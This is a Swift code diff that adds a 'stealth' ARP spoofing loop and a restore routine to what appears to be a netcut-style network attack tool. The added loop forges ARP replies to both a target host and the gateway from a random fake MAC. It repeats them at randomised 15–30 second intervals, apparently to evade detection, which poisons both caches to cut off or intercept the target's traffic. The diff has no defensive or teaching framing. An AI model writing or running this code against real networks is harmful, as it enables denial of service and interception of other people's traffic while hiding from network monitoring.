@@ -225,6 +225,34 @@ func sendRestore(bpf: NetcutxBPF, config: SpooferConfig) {
     }
 }
 
+func stealthSpoofLoop(bpf: NetcutxBPF, targetIP: String, targetMAC: MACAddr, gwIP: String, gwMAC: MACAddr) {
+    let fakeMAC = randomMAC()
+    var count = 0
+    while _stopFlag == 0 {
+        try? bpf.send(frame: Data(ARPFrame.buildReply(
+            srcMAC: fakeMAC, srcIP: gwIP, dstMAC: targetMAC, dstIP: targetIP).bytes))
+        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
+            srcMAC: fakeMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gwIP).bytes))
+        count += 1
+        let sleepTime = Double.random(in: 15...30)
+        let start = Date()
+        while Date().timeIntervalSince(start) < sleepTime {
+            if _stopFlag != 0 { break }
+            Thread.sleep(forTimeInterval: 0.1)
+        }
+    }
+}
+
+func stealthRestoreARP(bpf: NetcutxBPF, targetMAC: MACAddr, targetIP: String, gwMAC: MACAddr, gwIP: String) {
+    for _ in 0..<3 {
+        try? bpf.send(frame: Data(ARPFrame.buildReply(
+            srcMAC: gwMAC, srcIP: gwIP, dstMAC: targetMAC, dstIP: targetIP).bytes))
+        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
+            srcMAC: targetMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gwIP).bytes))
+        Thread.sleep(forTimeInterval: 0.1)
+    }
+}
+
 private func setIPForwarding(_ enable: Bool) -> Bool {
     let value = enable ? "1" : "0"
     let task = Process()
